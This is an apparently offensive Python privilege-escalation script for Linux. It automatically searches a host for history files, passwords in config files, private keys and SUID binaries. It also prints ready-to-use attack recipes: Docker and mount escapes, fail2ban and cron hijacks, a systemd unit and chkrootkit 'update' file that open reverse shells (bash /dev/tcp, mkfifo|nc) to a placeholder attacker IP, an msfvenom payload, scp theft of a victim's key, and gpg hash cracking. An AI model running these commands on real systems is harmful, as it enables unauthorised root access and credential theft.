...
if SCAN=='Y' or SCAN=='y':
    ...
    print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
    print("\t║This will scan all 255 IPs, and may take time based on the network range, please be patient. This will run normal   ║")
    print("\t║for loop in our case.                                                                                               ║")
    print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
...
os.system ("find / -iname *.*history* -print 2>/dev/null | xargs ls -la")
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║Have a look at history files, they might have sensitive information.                                                ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"╔═════{Are we in a restricted shell?",XX)
os.system ('env | grep -i "rbash\|chroot"')
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║Bypass Restricted Shell:                                                                                            ║")
print("\t║    https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/                                             ║")
print("\t║    https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf                           ║")
print("\t║If non of the above worked, try:                                                                                    ║")
print("\t║    echo '$'PATH                                                                                                    ║")
print("\t║    ls the directory and find an exploit                                                                            ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
...
os.system ('groups')
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║Sometimes, the user may be a part of a vulnerable group such as: lxd/lxc, Docker, Wheel, Shadow, Disk, Video, etc.  ║")
print("\t║Every group worths Googling for exploit.                                                                            ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"╔═════{Are we in Docker:",XX)
os.system ('find / -iname *.dockerenv -type f 2>/dev/null')
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║Escape the Docker container: Run fdisk -l to make sure wich drive to mount                                          ║")
print("\t║    mkdir /hdd && mount /dev/sda1 /hdd && chroot /hdd                                                               ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"╔═════{User ID & Groups possible escap:",XX)
os.system ('id | grep --color=always -i "docker\|lxd\|sambashare\|lpadmin\|adm\|sudo\|video\|disk\|disk\|shadow\|fail2ban" 2>/dev/null')
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║Docker:                                                                                                             ║")
print("\t║Run:                                                                                                                ║")
print("\t║    1) docker image ls                                                                                              ║")
print("\t║    2) docker run -v /:/mnt --rm -it <Image Name> chroot /mnt sh                                                    ║")
print("\t║https://gtfobins.github.io/gtfobins/docker/                                                                         ║")
print("\t║https://www.hackingarticles.in/docker-privilege-escalation/                                                         ║")
print("\t║https://fosterelli.co/privilege-escalation-via-docker.html                                                          ║")
print("\t║https://medium.com/@anushibin007/ha-chakravyuh-vulnhub-walkthrough-2be29373722a                                     ║")
print("\t║====================================================================================================================║")
print("\t║LXD/LXC:                                                                                                            ║")
...
print("\t║====================================================================================================================║")
print("\t║lpadmin:                                                                                                            ║")
print("\t║Members of lpadmin can read /var/run/cups/certs/0. With this key it is possible to access the cups web interface as ║")
print("\t║admin. You can edit the cups config file and set the page log to any filename you want (for example /etc/shadow).   ║")
print("\t║Then you can read the file contents by viewing the cups page log. By printing you can also write some random data   ║")
print("\t║to the given file.                                                                                                  ║")
print("\t║Exploit:                                                                                                            ║")
print("\t║https://www.exploit-db.com/exploits/43418                                                                           ║")
print("\t║Read More:                                                                                                          ║")
...
print("\t║====================================================================================================================║")
print("\t║fial2ban:                                                                                                           ║")
print("\t║File2Ban Enumeration:                                                                                               ║")
print("\t║    ls -l /etc/fail2ban/                                                                                            ║")
print("\t║    cat /etc/fail2ban/README.fox                                                                                    ║")
print("\t║    ls -l /etc/fail2ban/action.d (Do we have write permissions)                                                     ║")
print("\t║Reverse Shell: ** PUT SED COMMAND IN ONE LINE **                                                                    ║")
print("\t║    which nc bash sh                                                                                                ║")
print("\t║Way1)                                                                                                               ║")
print("\t║    sed -i 's:actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>:actionban = nc <Attacker IP> 443 -e     ║")
print("\t║    /usr/bin/bash:g' /etc/fail2ban/action.d/iptables-multiport.conf                                                 ║")
print("\t║Way2) create a cron job as root:                                                                                    ║")
print("\t║    sed -i 's:actionban = nc <Attacker IP> 443 -e /usr/bin/bash:actionban = echo '*  *  *  *  * root nc             ║")
print("\t║    <Attacker IP> 443 -e /usr/bin/bash' >> /etc/crontab:g' /etc/fail2ban/action.d/iptables-multiport.conf           ║")
print("\t║https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7   ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n")
print(RED," \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗",XX)
...
print( "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print( "\t║Read the following files, they might have password or hash in them.                                                 ║")
print( "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"╔═════{WiFi Creds:",XX)
...
os.system ("cat /etc/samba/smb.conf 2>/dev/null | grep -i 'pass\|cred\|hash' --color=always 2>/dev/null")
...
os.system ("cat /etc/apache2/apache2.conf | grep -i 'pass\|cred\|hash' --color=always 2>/dev/null")
print( "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
...
os.system ("env | grep -w 'LOGNAME\|HOME\|PATH\|SHELL\|PWD\|USER' --color=always ")
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
...
print("\t║  https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/                                    ║")
...
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║Run fdisk -l to list the hosts disks. Then do the following:                                                        ║")
print("\t║    mkdir /mnt/own                                                                                                  ║")
print("\t║    mount /dev/sda1 /mnt/own                                                                                        ║")
print("\t║    cd /mnt/own                                                                                                     ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
...
print("\t║    Type=simple                                                                                                     ║")
print("\t║    User=root                                                                                                       ║")
print("\t║    ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/a.a.a.a/80 0>&1'                                                    ║")
print("\t║    [Install]                                                                                                       ║")
...
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║SUID (set owner userId upon execution) is a special type of file permission given to a file. SUID gives temporary   ║")
print("\t║permissions to a user to run the program/file with the permission of the file owner rather than the user who runs it║")
...
print("\t║    ",RED,"echo 'bash -i >& /dev/tcp/a.a.a.a/80 0>&1' >> file",XX,"                                                          ║")
print("\t║    ",RED,"echo 'm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc a.a.a.a 80 >/tmp/f' >> file",XX,"                      ║")
...
print("\t║    ",RED,"From attacker PC: msfvenom -p cmd/unix/reverse_python lhost=a.a.a.a lport=80 (echo it to the file)",XX,"          ║")
...
print("\t║",RED,"Exploit:",XX,"                                                                                                        ║")
print("\t║    ",RED,"scp -P 22 username@v.v.v.v:/path/of/victim_rsa /path/to/attacker",XX,"                                            ║")
...
print("\t║  https://unix.stackexchange.com/questions/23291/how-to-ssh-to-remote-server-using-a-private-key                    ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"╔═════{id_dsa:",XX)
...
print("[*] .bak files:")
os.system ("find / -iname *.bak -type f 2>/dev/null --color=always")
print("\t╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
...
print("\t╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║Server version: 5.7.30 MySQL Community Server (GPL)                                                           ║")
print("\t║    https://www.trenchesofit.com/2021/02/15/offensive-security-proving-grounds-banzai-write-up-no-metasploit/ ║")
print("\t╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"╔═════{Is mysql service running as root:",XX)
os.system ('ps -aux | grep mysql 2>/dev/null --color=always')
print("\t╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║If so, escalate privilege root via user defined database functions (UDFs)                                     ║")
print("\t║    https://steflan-security.com/linux-privilege-escalation-exploiting-user-defined-functions/                ║")
print("\t║    https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf         ║")
print("\t╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"╔═════{MySQL:",XX)
...
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║If the file is owned by root and can be executed by the current user, try to read it, maybe ║")
print("\t║the file can be exploitd by abusing it's library                                            ║")
print("\t║  https://0xatom.github.io/tryhackme/2021/01/04/thm-wonderland/                             ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\t╔═══════════════════════════════════════════════════════════════════════════════╗")
print("\t║If the file is owned by root and can be executed by the current user, try to                      ║")
...
os.system ('find / -name "*.php" -print0 2>/dev/null | xargs -0 grep -i -n "var "$"password" --color=always')
print("\n",BLUE,"╔═════{Text Files:",XX)
...
print("\t║The file can be cracked by using one of the following steps:                                ║")
print("\t║  A) gpg --batch --passphrase ABCD -d file.gpg                                              ║")
print("\t║  B) gpg2john file.gpg > hash                                                               ║")
print("\t║     john hash -w=all                                                                       ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n${BLUE}╔═════{.pyc Files:${XX}")
os.system ('find / -iname *.pyc -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always | grep -v "/usr/\|/var/"')
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║Send the .pyc file to attacker PC and download uncompyle6 to decompile the file             ║")
print("\t║    uncompyle6 .pyc                                                                         ║")
print("\t║Try to understand how the file is writen and find out any possible way for PE               ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════╝")
...
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"╔═════{Chkrootkit:",XX)
os.system ('grep -rnw -i "ROOTDIR is" --color=always 2>/dev/null')
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════╗")
print("\t║If the system is running chkrootkit, run nc on attacker pc and run the following command on ║")
print("\t║victim PC:-                                                                                 ║")
print("\t║echo '#!/bin/bash' > update                                                                 ║")
print("\t║echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc a.a.a.a 1234 >/tmp/f' >> update ║")
print("\t╚════════════════════════════════════════════════════════════════════════════════════════════╝")
print("\n",BLUE,"╔═════{Modified Files Past 60 min:",XX)
os.system ("find / -mmin -60 -xdev 2>/dev/null | grep -v '/proc/\|/sys/\|/run/\|/dev/\|/var/' | xargs ls -ld --color=always 2> /dev/null")
print("\t╔════════════════════════════════════════════════════════════════════════════════════════════╗")
...
os.system ("find / -type d -name git-server -print 2>/dev/null")
print("\n",BLUE,"╔═════{Git User:",XX)
os.system ("cat /etc/passwd | grep git-shell 2>/dev/null")
